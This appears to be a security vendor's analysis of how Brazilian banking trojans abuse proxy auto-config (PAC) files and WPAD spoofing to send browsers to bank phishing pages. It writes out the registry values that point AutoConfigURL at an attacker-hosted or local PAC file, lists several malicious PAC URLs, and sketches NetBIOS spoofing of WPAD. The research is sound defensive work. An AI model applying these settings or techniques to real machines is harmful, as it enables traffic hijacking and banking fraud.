Proxy auto-config (PAC) files are a modern resource that exist on all modern browsers.
They define how web browsers and other user agents can automatically choose the appropriate proxy server (access method) to fetch a given URL.
The PAC file format was originally designed by Netscape in 1996 for Netscape Navigator 2.0.
A browser supporting PAC provides access to a list of functions as defined in the original Netscape Specification.
Each browser implements PACs in a sandbox, only allowing access to those JavaScript functions required to operate and nothing more.
For example, it isn’t possible to access the browser user agent string in a PAC file, although this string would be available to a normal web page.
A PAC is a text file that defines at least one JavaScript function, FindProxyForURL(url, host), with two arguments: “url” is the URL of the object and “host” is the host-name derived from that URL.
This function returns the address of a proxy server that must be used to reach a specified URL, or the string “DIRECT”, if no proxy is needed.
By convention, the PAC file is normally named proxy.pac.
On corporate networks this is extremely useful for network administrators, as it allows them to redirect internal traffic.
The location of a PAC file is specified – for example it could point to a URL where the script is located; this URL must be configured on the browser’s settings:
Image 1: URL pointing to a PAC file on Internet Explorer
Or it could be hosted locally:
Image 2: locally PAC file configured on Firefox
A PAC file can provide proxy failover support, advanced proxy bypass support, and much more:
Proxy failover support.
Advanced/dynamic proxy bypass rule support, can resolve hosts/IPs using DNS to reduce bypass list complexity.
Supported in all major browsers
Most deployments will require web server infrastructure.
Requires JavaScript knowledge.
Table 1: Pros and cons of using PACs
The functions supported and allowed in the sandbox environment are documented below:
dnsDomainIs: evaluates hostnames and returns “true” if the hostnames match.
shExpMatch: attempts to match a hostname or URL to a specified shell expression, and returns “true” if matched.
isInNet: evaluates the IP address of a hostname, and returns “true” if it found within a specified subnet.
If a hostname is passed the function will resolve the hostname to an IP address.
myIpAddress: returns the IP address of the host machine.
dnsResolve: resolves hostnames to an IP address.
This function can be used to reduce the number of DNS lookups.
isPlainHostName: this function will return “true” if the hostname contains no dots, e.g.
http://intranet.
Useful when applying exceptions for internal websites, since it may eliminate the need to resolve a hostname to its IP address to determine that it is local.
localHostOrDomainIs: evaluates hostname and only returns “true” if an exact hostname match is found.
isResolvable: attempts to resolve a hostname to an IP address and returns “true” if successful.
dnsDomainLevels: this function returns the number of DNS domain levels (number of dots) in the hostname.
Can be used to make exceptions for internal websites which use short DNS names, e.g.
http://intranet
timeRange, dateRange, weekdayRange: allows rules to be time based, e.g.
only return a proxy during specific hours, days, or months.
alert: the alert() function is not part of the original PAC specification, although support for this is included in Internet Explorer and Firefox.
The function can be used to output the value of a variable or the result of a function in a manner that can be viewed by the end user.
This can be useful for troubleshooting PAC file rule issues.
An of a PAC file below:
Image 3: example of a generic PAC file
The Web Proxy Auto-Discovery Protocol, or WPAD, is a variation of a standard PAC file which enables Windows machines to determine which machine to use as proxy for HTTP(S) traffic.
A browser that supports both DHCP and DNS will first attempt to locate a PAC file using DHCP.
If there is no DHCP configuration it will fail-over to DNS WPAD.
Just like PAC files, the WPAD method also has advantages and disadvantages when used on corporate networks:
Includes all PAC advantages.
Deployment only requires a check box be selected.
Includes all PAC disadvantages.
Requires DNS or DHCP infrastructure changes.
Table 2: pros and cons of using WPAD
The process of finding a web proxy with WPAD basically works like this:
Did I receive a WPAD entry in my DHCP lease?
If yes, then jump to #4.
Ask the DNS server which network user is called “wpad” (or wpad.[mydomain.com]).
Jump to #4 if the lookup was successful.
Broadcast a NetBIOS Name Service message and ask for “WPAD”.
Continue to #4 if anyone on the network claims to be called “WPAD”, otherwise don’t use any web proxy.
Download the file http://wpad/wpad.dat
Use the IP address defined in wpad.dat as the web proxy for all HTTP and HTTPS web traffic.
Windows’ WPAD feature has for many years provided attackers and penetration testers a simple way to perform MITM attacks on web traffic.
This method was used by Flame malware to launch a MITM on Windows Update connections on an infected network.
The problem with Windows WPAD implementation lies in the fact that it uses the NetBIOS Name Service (NBNS henceforth) to resolve the address of the “WPAD” server, and NBNS is vulnerable to spoofing attacks.
By default, Windows machines are configured in such a way that they will first try to ask the WINS server for a name.
The WINS server is very unlikely to be configured so it will then ask all computers in the local subnet if they know an address of a computer by that name.
And this is where the spoofing comes in.
Image 4: NetBIOS Name Service query for WPAD
An attacker could develop an application that will listen to the UDP 137 port and answer to all WPAD queries with the address of the attacker’s webserver.
The webserver, in turn, could provide a malicious PAC file that directs victim browsers to use specific proxy servers to connect to websites of interest to the attacker.
Although PAC is a legitimate feature, the abuse of PAC files has been known since 2005.
The technique was improved and refined by Brazilian cybercriminals, and then it was shared with cybercriminals from Turkey and Russia.
These attacks have reached a hitherto unseen level of complexity and effectiveness, making it possible to use a 1 KB file to hack an entire bank account.
Combining a lot of creativity with drive-by download attacks, these malicious scripts can do more than simple man-in-the-middle raids; they are able to impersonate HTTPS connections in silent, web-based attacks which can be launched regularly and successfully.
Generally these redirect users to the phishing pages of banks, credit card companies, etc.
In Brazil malicious PAC files in Trojan bankers have been increasingly common since 2009, when several families such as Trojan.Win32.ProxyChanger started to force the URLs of PAC files in the browser of infected machines.
Image 5: a phishing page of Brazilian Bank in a web browser configured with a malicious PAC
Today at least 6 out of 10 Brazilian Trojan bankers have a feature which can add a malicious PAC to the browser’s config.
Image 6: a plain text malicious PAC file created and used by Brazilian cybercriminals
Some Trojans also try to change the prefs.js file used by Mozilla Firefox to set proxy configurations:
Image 7: A Trojan banker preparing to change prefs.js on Firefox
This attack is very simple; all a Trojan needs to do is to change this single value on the Windows Registry, adding an URL to the PAC file:
HKCUSoftwareMicrosoftWindowsCurrentVersionInternet Settings: “AutoConfigURL = http://www.badsite.com/pacscript.pac
Or adding a path to a small file (generally less than 1 KB), hosted locally:
HKCUSoftwareMicrosoftWindowsCurrentVersionInternet Settings,AutoConfigURL = file://C:/WINDOWS/proxy.pac
Some attacks also change the values of the key below, which is responsible for setting an auto-proxy in the Internet connection’s name:
HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionInternet SettingsConnections{CONNECTION NAME}
Cybercriminals can greatly increase their options for attacks – and the potential number of victims – by combining this technique with drive-by-download attacks, exploiting Java vulnerabilities, inserting malicious applets on popular websites, or even using exploit kits such as BlackHole.
Image 8: snippet of a BlackHole payload used by Brazilian cybercriminals to change the PAC settings on a victim’s computer
It is so effective that Russian Trojan bankers such as Trojan-Banker.Win32.Capper also adopted the same technique in 2012, together with forged digital certificates, aiming to redirect users to an HTTPS phishing page.
Some fraudsters decided to use social engineering to trick the user and keep the malicious URL configured on the browser settings by using deceptive domain names which appear at first glance to be legit.
Some examples:
http://egcon.com.br/images/avast.pac http://defaultcache.com.br/ie http://vpn.install-pcseguro.com/ssl.js http://update.microsoft.com.br-ieconfig.ma.cx/security.jsp http://sec.autoatt.com/ http://ww1.appsegurancamobile.com/kb2438658.php
As part of the detection and protection we offer our users we started blocking URLs which pointed to malicious PAC files.
In response, some Trojans adopted random URLs which change at every reboot.
Other Trojans started using short URLs from services like bit.ly, hoping to control redirections and collate stats.
Image 9: A bit.ly URL pointing to a PAC file with more than 1 million hits in 10 days
We found that denylisting did not provide adequate protection, so we decided to create signature detections for these small PAC files, using the verdict Trojan-Banker.JS.Proxy.
We did it for many files:
Image 10: Some signature detections for malicious PAC files
Then our cat-and-mouse game with Brazilian cybercriminals started to get more interesting.
As some anti-malware companies started to work on signature detection for malicious PAC scripts, criminals responded with greater code obfuscation in a bid to bypass detection.
This proved successful: even today almost every AV company has a very low detection rate for these malicious PACs.
Because it is a legitimate feature of user browsers, and because there are genuine PACs, security products are often very cautious about detecting it for fear of throwing up a false positive.
Some aren’t prepared to offer any solution to this problem.
To bypass signature detection Brazilian cybercriminals started to use all kinds of JavaScript obfuscation on these malicious PAC files.
Some went further, creating tools to automate this obfuscation and trading it among their partners in crime at a cost of R$5,000 (around US$ 2,500).
Image 11: “PAC do Baixada” crimeware developed in Brazil to obfuscate the code of malicious PACs
Others prefer to use websites that offer Javascript encryption:
Image 12: an online tool to encrypt Javascript
This released some unusual crypto malicious scripts into the wild.
They had all kinds of obfuscation, like this one, with concatenate strings:
Image 13: PAC using concatenate strings
Or this one with mirrored strings:
Image 14: PAC using mirrored strings
Others decided to replace the name of the domains targeted by the script or by the IP of the webpage:
Image 15: PAC using IPs instead of domain names
Others emerged using advanced JavaScript obfuscation:
Image 16: highly obfuscated malicious PAC
Other scripts started to use encryption to add a lot trash symbols:
Image 17: malicious PAC using trash symbols and charcode
In some PAC files, cybercriminals even started to send warning messages to Malware Analysts, such as this one:
Image 18: The message in the head of the PAC says: “f*ck, why are these motherf*ckers sniffing (my PACs)?
Come on, go suck a [redacted], let me work freely, I need to feed my family, bunch of mother*ckers, go easy on me!!
If you want to work with me send an e-mail to xxxxxx@bol.com.br”
